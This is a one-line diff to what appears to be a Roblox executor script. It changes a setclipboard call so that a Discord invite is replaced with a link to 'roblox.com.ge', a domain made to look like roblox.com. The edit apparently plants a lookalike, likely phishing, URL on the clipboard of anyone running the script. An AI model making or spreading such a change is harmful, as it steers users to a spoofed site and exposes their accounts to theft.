@@ -1,1 +1,1 @@
-setclipboard("https://discord.gg/s64nG74WD")
+setclipboard("https://roblox.com.ge/users/9966160340/profile")
